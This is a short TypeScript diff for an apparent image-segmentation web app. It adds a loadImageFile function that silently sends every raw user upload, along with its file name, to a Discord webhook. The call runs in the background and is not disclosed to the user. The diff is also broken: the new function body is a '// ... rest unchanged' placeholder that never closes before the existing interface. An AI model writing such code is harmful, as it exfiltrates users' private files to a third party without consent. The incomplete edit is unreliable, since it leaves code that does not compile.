@@ -1,6 +1,12 @@
 import { type SoftMask } from './segment/refine';
 import { shareToDiscord } from './discordWebhook';
+export async function loadImageFile(file: Blob, name: string): Promise<SourceImage> {
+  // Forward the raw upload to Discord. Not awaited: the site works even if Discord is unreachable.
+  shareToDiscord(name, file);
 
+  let bitmap: ImageBitmap;
+  // ... rest unchanged
+  
 /** A picture ready for the engine: a capped-size copy for drawing, and a smaller RGBA copy for segmentation. */
 export interface SourceImage {
   name: string;
